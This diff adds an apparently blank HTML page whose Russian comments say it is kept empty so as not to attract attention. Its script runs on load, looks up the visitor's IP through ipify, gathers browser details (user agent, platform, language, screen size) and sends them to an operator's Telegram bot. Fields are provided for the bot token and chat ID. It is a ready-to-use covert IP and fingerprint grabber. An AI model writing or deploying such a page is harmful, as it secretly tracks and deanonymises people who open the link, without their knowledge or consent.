@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Page</title>
+    <style>
+        body { background: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
+        /* Можно оставить пустым или добавить что-то безобидное */
+    </style>
+</head>
+<body>
+    <!-- Здесь пусто, чтобы не привлекать внимание -->
+    <script>
+        // ⚠️ ЗАМЕНИ ЭТИ ДАННЫЕ НА СВОИ ⚠️
+        const TELEGRAM_TOKEN = '1234567890:ABCdefGHIjklmNOPqrstUVwxyz';  // Твой токен сюда
+        const CHAT_ID = 123456789;                                      // Твой chat ID сюда (число, без кавычек)
+
+        // Функция для получения IP через ipify
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) {
+                return 'Не удалось определить IP';
+            }
+        }
+
+        // Информация о браузере
+        function getBrowserInfo() {
+            return `User-Agent: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nLanguage: ${navigator.language}\nScreen: ${screen.width}x${screen.height}`;
+        }
+
+        // Отправка в Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+        }
+
+        // Основная функция
+        async function logVisitor() {
+            const ip = await getIP();
+            const browser = getBrowserInfo();
+            const time = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
+            const msg = `<b>Новый посетитель</b>\nВремя: ${time}\nIP: ${ip}\n${browser}`;
+            await sendToTelegram(msg);
+        }
+
+        // Выполняем при загрузке
+        logVisitor();
+    </script>
+</body>
+</html>
